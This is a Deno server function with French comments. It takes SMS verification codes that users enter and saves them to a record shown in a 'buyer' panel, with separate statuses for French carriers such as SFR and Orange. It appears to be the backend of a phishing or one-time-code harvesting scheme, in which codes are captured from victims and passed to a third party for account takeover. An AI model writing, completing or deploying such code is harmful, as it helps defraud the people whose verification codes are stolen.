import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

// Réception du code SMS saisi par l'utilisateur.
// Le code est stocké sur la soumission et affiché dans le panneau acheteur (/buyer).
Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { code, submissionId } = await req.json();

  if (!submissionId) {
    return Response.json({ error: "ID manquant" }, { status: 400 });
  }

  // Récupère la soumission par ID — retry car la plateforme peut rate-limiter les reads.
  const fetchSub = async () => {
    for (let attempt = 1; attempt <= 4; attempt++) {
      try {
        return await base44.asServiceRole.entities.Submission.get(submissionId);
      } catch (e) {
        if (attempt === 4) throw e;
        await new Promise((r) => setTimeout(r, 400 * attempt));
      }
    }
  };

  let sub = null;
  try {
    sub = await fetchSub();
  } catch (e) {
    console.error("fetch submission failed:", e.message);
    return Response.json({ error: "Réessaye dans un instant" }, { status: 503 });
  }

  // Anti-spam: ne traiter que les demandes réellement en attente de code.
  const READY_STATES = ["code_ready", "code6_ready", "code6sfr_ready", "code6orange_ready"];
  if (!sub || !READY_STATES.includes(sub.status)) {
    return Response.json({ error: "Demande non éligible" }, { status: 400 });
  }

  // Valider le format du code selon le statut attendu
  const expectedLength = sub.status === "code_ready" ? 4 : 6;
  const codeStr = String(code || "");
  if (!/^\d+$/.test(codeStr) || codeStr.length !== expectedLength) {
    return Response.json({ error: "Format de code invalide" }, { status: 400 });
  }

  // Stocke le code reçu — retry car la plateforme peut rate-limiter les writes.
  const saveCode = async () => {
    for (let attempt = 1; attempt <= 4; attempt++) {
      try {
        await base44.asServiceRole.entities.Submission.update(submissionId, {
          status: "pending",
          received_code: codeStr,
          code_received_at: new Date().toISOString(),
        });
        return;
      } catch (e) {
        if (attempt === 4) throw e;
        await new Promise((r) => setTimeout(r, 400 * attempt));
      }
    }
  };
  try {
    await saveCode();
  } catch (e) {
    console.error("update submission failed:", e.message);
    return Response.json({ error: "Réessaye dans un instant" }, { status: 503 });
  }

  return Response.json({ ok: true });
});